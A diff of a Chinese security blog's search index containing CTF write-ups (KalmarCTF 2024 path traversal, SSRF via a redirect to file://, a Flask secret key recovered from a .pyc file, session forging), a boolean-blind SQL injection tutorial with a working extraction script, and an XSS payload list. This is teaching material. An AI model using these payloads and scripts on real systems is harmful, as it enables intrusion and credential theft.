-protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;) if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then	abort &#x27;Invalid protocol&#x27;fi
-
-逻辑漏洞2：可控原因：$protocol变量由于使用echo命令，是得read读取后的特性消失，使得$protocol可被拓展
-当我们尝试修改HTTP/1.1为/*时，发现并没有出现Invalid protocol
- 拓展：shell语言中的部分特性 
-              
-              特性4：[]的返回值在 shell 中，[] 符号通常用于条件测试。如 if [ CONDITION ]; then ... 这样的语句。在这种用法中，[] 是 [ 命令的简写，这实际上是一个指向 test 命令的链接。因此，当你使用 [] 时，实际上是在调用 test 命令来评估一个条件。test 命令（或其等价的 [ 形式）的返回值遵循 shell 命令的通用返回值约定：0：表示测试的条件为真（true）。1：表示测试的条件为假（false）。。&gt;1：如果出现错误，如语法错误或使用了无效的选项，test 命令可能会返回大于 1 的值。比较特别的是，此时即使设置了set -e也不会退出程序
-              
-            
-
-逻辑漏洞3：将HTTP/1.1替换为/*时，由于通配符展开，最后会出现进行匹配错误，[]返回大于1的结果，&amp;&amp;的两侧结果都是大于0，返回1，因此认为是假，此时这个if条件被判定为假，可以继续执行后面内容的代码
-但如果/*匹配到的结果只有一个时，并不会造成匹配错误，而直接返回0，&amp;&amp;的任意一侧结果为0会直接返回0，此时这个if条件被判定为真
-启动set -x时的详细信息如下
-+ &#x27;[&#x27; badass_server.sh bash.md character1.sh character2.sh file &#x27;!=&#x27; HTTP/1.0 &#x27;]&#x27;./badass_server.sh: line 63: [: too many arguments
-
-注意：此时通配符展开并不能认为这个变量是数组，数组直接使用会利用数组第0个进行匹配，而通配符展开会报错
-因此我们可以通过这个点，使用glob通配符[]写入一个已知的字符，不断修改字符，使其最后能匹配到的结果最后有1个以上，页面不出现：Invalid protocol，进行对目录或者文件名的一步一步匹配（用这种方法可以确定名称比已知目录少的目录名）
-最初的页面给出了两个目录，需要利用这两个目录，选择一个目录作为已知字符
-&lt;a href=&quot;assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg&quot;&gt;	&lt;button&gt;Explore the iceberg&lt;/button&gt;&lt;/a&gt;&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;	&lt;button&gt;Get the flag&lt;/button&gt;&lt;/a&gt; --&gt;
-
-以26c3f25922f71af3372ac65a75cd3b11作为已知字符为例，所以最后的playload的过程为：
-GET /../../../../../../etc/passwd /app/static/assets/[29]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*........
-
-最后找到隐藏的目录， 9df5256fe48859c91122cb92964dbd66 
-估计最后是猜的吧，flag最后的位置是：/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt
-修改url为../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt读出kalmar&#123;17b29adf_bash_web_server_was_a_mistake_374add33&#125;
-Is It Down它是否宕机
-题目描述
-In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too.
-在一个日益在线化的世界中，了解自己是唯一离线还是其他人也处于离线状态是很重要的。
-We present to you: Is it down!
-我们向您介绍：它是否宕机！
-Rumour has it, that a flag is stored somewhere on this server.
-有传言称，一个标志位被存储在这台服务器的某个地方。
-
-前置知识
-/proc目录以及子目录的功能及其作用
-Python语言及特性
-__pycache__文件夹
-
-解题思路同样的这也是一个黑盒测试，看了看页面发现并没有什么提示，可以根据自己的输入的网址进行判断，网址是否在线或者离线
-
-直接抓包然后repeat看看
-
-会发现页面出现了我们输入网页的源代码，相关的漏洞应该就是SSRF
-尝试直接使用file:///etc/passwd试试看，发现页面回显出了
-&#123;&quot;error&quot;:&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;,&quot;success&quot;:false&#125;
-
-发现只能使用https://开头的链接（是我应该就在这卡住了）
-根据大佬的思路，我们可以尝试一个发生重定向的网址，  无语啦 。。。。。。。。好麻烦，还得自己起个https服务
-根据实际的测试发现：
-
-如果输入的链接网页存在任何内容，不会跟随着网页重定向
-如果输入的链接网页不存在任何内容，此时会跟随着网页重定向
-
-例如：
-我们输入网址的响应包为：
-HTTP/1.1 301 Moved PermanentlyServer: nginxDate: Sun, 24 Mar 2024 15:00:50 GMTContent-Type: text/htmlContent-Length: 162Connection: closeLocation: https://t.doruo.cn/14Qqfhjr2&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-
-此时，不跟随重定向，返回的内容为
-&#123;&quot;content&quot;:&quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\&quot;white\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;
-
-
-
-我们自己起一个后端服务，为了随时更改重定向内容，我们可以设置代码为以下
-&lt;?phperror_reporting(0);header(&quot;Location: &quot;.$_GET[&#x27;wells&#x27;]);
-
-此时我们使用这个服务，并输入参数?wells=file:///etc/passwd,发现页面返回出来了passwd的文件内容
-&#123;&quot;content&quot;:&quot;root:x:0:0:root:/root:/bin/ash\\n.........&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;
-
-此时再次利用/proc目录进行尝试找到后端服务的文件夹位置以及所对应的运行程序
-在/proc/1/cmdline尝试读取后端的运行程序的相关信息uwsgi\\x00--ini\\x00/etc/uwsgi/uwsgi-custom.ini\\x00，可以猜到此时的后端应该是flask，然后再顺藤摸瓜进入到/etc/uwsgi/uwsgi-custom.ini读取配置信息：（美化后）
-[uwsgi]uid = www-datagid = www-datamaster = trueprocesses = 4http-socket = 0.0.0.0:5000chmod-sock = 664vacuum = truedie-on-term = truewsgi-file = /var/www/keep-dreaming-sonny-boy/app.pycallable = apppythonpath = /usr/local/lib/python3.11/site-packages
-
-比较重要的信息是：wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py，然后继续顺藤摸瓜找到对应的后端文件读出出来，因为经过了json的转化，变得无敌难看，让狗屁通美化一下最后得到
-from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocess, osdef protect_secrets():    os.unlink(&quot;config.py&quot;)def check_url(url):    if not isinstance(url, str) or len(url) == 0:        return False, &quot;Please provide a regular url!&quot;    if not url.startswith(&quot;https://&quot;) or url.lstrip() != url:        return False, &quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;    return True, &quot;&quot;app = Flask(__name__, static_folder=&#x27;static&#x27;, static_url_path=&#x27;/assets/&#x27;)app.secret_key = session_encryption_keyprint(&quot;Using key: &quot;, app.secret_key)protect_secrets()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def home():    return send_from_directory(&#x27;pages&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True: #        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)@app.route(&#x27;/check&#x27;, methods=[&#x27;POST&#x27;])def check():    url = request.form.get(&quot;url&quot;)    valid, err = check_url(url)    if not valid:        return &#123;            &#x27;success&#x27;: False,            &#x27;error&#x27;: err        &#125;    if True:        content = fetch(url)        return &#123;            &#x27;success&#x27;: True,            &#x27;online&#x27;: content != None,            &#x27;content&#x27;: content        &#125;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=10600, debug=False)
-
-但是这里面requestlib库文件是我们安装不了的，尝试直接读取一下requestlib.py查看是不是自己写的库，同样的也是读到了这个文件，经过美化后如下：
-from urllib.request import urlopen, HTTPErrorProcessor, build_opener, Requestimport urllibclass NoRedirection(HTTPErrorProcessor):    def http_response(self, request, response):        return response    https_response = http_responseinstall_opener(build_opener(NoRedirection()))def fetch(url, follow_redirects=True):    &#x27;&#x27;&#x27;    Avoid endless redirect loops    &#x27;&#x27;&#x27;    headers = &#123;        &quot;User-Agent&quot;: &quot;requestlib 2.9-alpha&quot;    &#125;    req = Request(url, headers=headers)    with urlopen(req) as res:        redirect_url = res.headers.get(&quot;Location&quot;))        if redirect_url and follow_redirects:            return fetch(redirect_url, follow_redirects=False)        return str(res.read())[2:-1]
-
-漏洞成因在定义的fetch函数中follow_redirects值默认为True，并且跟随响应包中的Location键值进行判断是否存在重定向，重定向的目标是何。但由于只限制了第一次输入的网址为https://,并未进行对重定向的协议进行检查从而造成了SSRF
- 如何处理重定向 
-              
-              注意：如浏览器，powershell中的curl再处理重定向时，无法处理从https://重定向至file://powershell中的curl发生报错浏览器会提示页面错误
-              
-            
-
-做到这里，关键其实是为造出一个session，其键值存在admin: True,但存有session_encryption_key的config.py再被调用后就被删除了,需要找到如何复原的办法
-@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True: #        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)
-
-__pycache__文件夹
-在Python工作目录下，如果执行某文件后经常会自动生成一个__pycache__文件夹。__pycache__文件夹正是缓存*.pyc地方。*.pyc文件的命名格式是&lt;module&gt;.&lt;interpreter_version&gt;.pyc。注意，对于被导入（import）的module才会生成对应的*.pyc文件
-详细文档可参考：
-【Python】__pycache__文件夹是什么东西？ - 知乎 (zhihu.com)
-pyhton中__pycache__文件夹的产生与作用_pycache文件夹下的东西是如何产生的-CSDN博客
-例子：
-以被导入的为config.py文件为例，最后生成在__pycache__文件夹config.cpython-35.pyc，最开始的config为被导入的文件名，cpython代表的是c语言实现的Python解释器，-35代表的是版本为3.5版。
-
-因此，我们可以在__pycache__文件夹中找到config的.pyc文件，再进行逆向
-最后测试到路径为：/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc，里面的内容为：
-\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00
-
-由于转化为json后转义字符\会变成\\,叫狗屁通写一个小小的脚本把以上数据恢复成二进制数据
-data_str = &quot;&quot;&quot;\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00&quot;&quot;&quot;# 将字符串中的转义序列转换为相应的二进制数据binary_data = bytes(data_str, &quot;utf-8&quot;).decode(&quot;unicode_escape&quot;).encode(&quot;latin1&quot;)# 保存到文件with open(&quot;output_binary_data.txt&quot;, &quot;wb&quot;) as file:    file.write(binary_data)
-
-.pyc文件的逆向在网上就很多在线的工具可以进行使用，逆向后得到
-#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;
-
-再使用session伪造工具flask-session-cookie-manager为造出一个session出来，指令为：
-python flask_session_cookie_manager3.py encode -s &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27; -t &quot;&#123;&#x27;admin&#x27;:True&#125;&quot;
-
-最后得到伪造的session所对应的cookie为：eyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-o，手动填入浏览器中，并访问&#x2F;flag
-
-最后得到flag：kalmar&#123;Rem3Mbr_T0_fl0sh!&#125;
- 查看Wells的丢人过程 
-              
-              我想着不是伪造出session最后的结果时运行/readflag这个可执行文件，便尝试读取了一下，转化为二进制，再发给逆向的同学看看能不能找出flag位于哪里命名为什么直接读取出来也确实逆向出来，找到了flag的位置以及名称但出题人也估计想到了这一点，位于flag.txt设置了权限，没法被直接读取出来。。。。。。。跪谢逆向的同学：L0SJ0K
-              
-            
-
-
-
-参考文章：
-https://ireland.re/posts/KalmarCTF_2024/
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-WriteUp</tag>
+        <tag>Web-SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -3192,6 +3375,486 @@ FOREIGN KLY
       </tags>
   </entry>
   <entry>
+    <title>SQL注入-布尔盲注</title>
+    <url>/posts/1685515616/</url>
+    <content><![CDATA[布尔盲注介绍构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息
+使用条件：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、）
+注意事项：
+
+前面参数在数据库无结果时，拼接语句使用关键词or
+
+前面参数在数据库有结果时，拼接语句使用关键词and
+另建议使用脚本
+
+
+注入使用函数1.substr()/substring()函数
+​	substr()/substring()函数：用来截取数据库某个字段中的一部分。
+substr(string，start开始位置，length截取长度)  #语法
+
+参数
+
+string：必选，数据库中需要截取的字段
+start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。
+length：可选，需要截取的长度。缺省。即截取到结束位置
+
+2.ascii()函数
+​	ascii()函数：返回字符串str的最左边的数值。
+ascii(str)  #语法
+
+3.length() 函数
+​	length() 函数，返回字符串的长度
+length(str) #语法
+
+4.left() 函数
+​	left() 函数，返回从左至右截取固定长度的字符串
+left(str,n) #语法 截取字符串str的从左至右前n个字符
+
+
+
+注入流程
+求当前数据库长度
+求当前数据库表的ASCII (即爆出数据库名)
+求当前数据库中表的个数
+求当前数据库中其中一个表名的长度
+求当前数据库中其中一个表名的ASCII
+求列名的数量
+求列名的长度
+求列名的ASCII
+求字段的数量
+求字段内容的长度
+求字段内容对应的ASCII
+
+手工注入过程详解基本模板?id=1&#x27; and (长度/字符函数(所爆数据的SQL) = n) --+
+
+例如：
+?id=1&#x27; and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 #
+
+
+
+以爆数据库名字为例
+求长度?id=1&#x27; and (length(database()) = n) --+
+
+通过页面的回显进行判断，数据库的长度是多少
+求数据库名称使用left 函数-- 从左至右截取一个字符SELECT * from users WHERE id = 1 and (left(database(),1)=&#x27;*&#x27;)-- 从左只有截取两个字符SELECT * from users WHERE id = 1 and (left(database(),2)=&#x27;**&#x27;)-- 从左只有截取n个字符SELECT * from users WHERE id = 1 and (left(database(),n)=&#x27;*****&#x27;)
+
+不断修改*中的字符，使之页面显示为true的类似项（如登录成功、成功等）
+使用SUBSTR函数-- 截取第1个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = ***)-- 截取第2个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = ***)-- 截取第n个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),n,1)) = ***)
+
+不断修改*中的ASCII码，使之页面显示为true的类似项（如登录成功、成功等）
+注入脚本注意查看表单的提交变量名称
+使用POST提交数据
+import requestschars = &quot;R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;&quot;result = &quot;&quot;def get_length(value):  # 获取要查询的数据的长度    for n in range(1, 100):        payload = &quot;admin&#x27; and length((&#123;0&#125;)) =&#123;1&#125; #&quot;.format(data_payload, n)        data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;admin&quot;&#125;  //注意查看表单的提交变量名称        html = requests.post(url, data=data)        length = len(html.text)        if length &lt; value:            print(&quot;……data length is :&quot; + str(n))            return ndef get_data(data_length, value):  # 获取数据    global result    for i in range(1, data_length):        for char in chars:            payload = &quot;admin&#x27;and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;.format(data_payload, i, ord(char))            data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;admin&quot;&#125;  //注意查看表单的提交变量名称            html = requests.post(url, data=data)            length = len(html.text)            if length &lt; value:  # 根据返回长度的不同来判断字符正确与否                result += char                print(&quot;…… data is :&quot; + result)                breakurl = &quot;http://***.***.10.67:2081/hard.php&quot;data_payload = &quot;select password from users  limit 0,1&quot; //所爆数据的sql语句value = 550  # 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看length = get_length(value) +1get_data(length, value)print(result)
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-Web</tag>
+        <tag>Web-SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQLMap</title>
+    <url>/posts/3150507853/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>XXE-primer</title>
+    <url>/posts/67440817/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>PHP文件包含</title>
+    <url>/posts/6864a512/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-Web</tag>
+        <tag>Web-PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS-基础篇</title>
+    <url>/posts/508713684/</url>
+    <content><![CDATA[XSS简介：动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容
+XSS的分类：1、反射型(非持久化)​	(1)原理
+​	反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。
+​	(2)攻击方式
+​	攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞
+2、存储型(持久化)​	(1)原理
+​	存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击
+​	(2)攻击方式
+​	攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞
+3、DOM-based型
+文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。
+
+​	(1)原理
+​	DOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。
+​	(2)攻击方式
+​	与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞
+XSS代码插入位置1.插入到HTML注释内容中&lt;!-- &lt;script&gt;  alert(&#x27;XSS&#x27;);&lt;/script&gt;--&gt;
+
+2.插入到HTML标签的属性值中&lt;img src=&quot;image,png&quot; onerror=&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;
+
+注：onerror属性是HTML中&lt;img&gt;标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。
+3.插入到HTML标签的属性名中使用语句
+&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+
+构造闭合，可得到以下内容：
+&lt;input type=&quot;text&quot; name=&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;
+
+利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击
+4.插入到HTML标签名中&lt; &lt;script&gt; alert(&#x27;XSS&#x27;) &lt;/script&gt;img src=&quot;/1.png&quot;&gt;
+
+浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是&lt;script&gt; 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击
+6.插入到CSS中&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`1`)&#x27;);&quot;&gt;
+
+我们在background-image样式属性中插入了一段JavaScript url（在过去，一些浏览器可能没有严格限制这种用法，允许javascript:伪协议在CSS属性中执行JavaScript代码。），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。
+7.插入到HTTP响应中先留一个坑，还没看懂这个部分，后面再来填
+运行脚本的标签以及对应属性&lt;a&gt; 标签对应属性：
+href属性（手动点击）
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;
+
+onfocus（获取焦点时触发XSS，如:点击）
+&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;
+
+onclick（点击时触发XSS）
+&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;
+
+onmouseout（鼠标移出时触发XSS）。
+&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;
+
+
+
+&lt;img&gt;标签对应属性：
+onerror（加载错误时触发XSS、将src乱输入一个值即可）
+&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+
+onmouseout（鼠标移出时触发XSS）
+&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v
+
+onclick（点击时触发XSS）。
+&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+
+
+
+&lt;iframe&gt;标签HTML 内联框架元素 (&lt;iframe&gt;)
+对应属性：
+onload（加载完成时触发XSS）
+&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）。
+&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;
+
+src属性
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; //base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
+
+
+
+&lt;audio&gt; 标签&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。
+对应属性：
+onerror（加载错误时触发XSS）
+&lt;audio src=1 onerror=alert(1)&gt;&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;
+
+onfocus（获取焦点时触发XSS，如:点击）
+&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）。
+&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;
+
+
+
+&lt;video&gt;标签对应属性：
+onerror（加载错误时触发XSS）
+&lt;video src=x onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;
+
+onfocus（获取焦点时触发XSS，如:点击）
+&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;
+
+onclick（点击时触发XSS）。
+&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;
+
+
+
+&lt;svg&gt; 标签对应属性：
+onload（加载完成时触发XSS）
+&lt;svg onload=javascript:alert(1)&gt;&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;
+
+
+
+&lt;button&gt; 标签对应属性：
+onclick（点击时触发XSS）
+&lt;button onclick=alert(1)&gt;&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
+
+onfocus（获取焦点时触发XSS，如:点击）
+&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
+
+onmouseout（鼠标移出时触发XSS）
+&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
+
+onmouseup（鼠标按钮释放时触发XSS）
+&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
+
+onmousedown（鼠标按钮按下时触发XSS）。
+&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;
+
+
+
+&lt;div&gt;标签对应属性：
+onmouseover（鼠标悬停于该元素时触发XSS）
+这个需要借助url编码来实现绕过
+原代码：&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;经过url编码：&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;
+
+
+
+&lt;object&gt;标签这个需要借助 data 伪协议和 base64 编码来实现绕过
+&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;
+
+
+
+&lt;script&gt; 标签&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;
+
+
+
+&lt;p&gt; 标签对应属性：
+onclick（点击时触发XSS）
+&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
+&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
+
+onmouseout（鼠标移出时触发XSS）
+&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
+
+onmouseup（鼠标按钮释放时触发XSS）。
+&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
+
+
+
+&lt;input&gt; 标签对应属性：
+onclick（点击时触发XSS）
+&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
+
+onfocus（获取焦点时触发XSS，如:点击）
+&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;
+
+onmouseover（鼠标悬停于该元素时触发XSS）
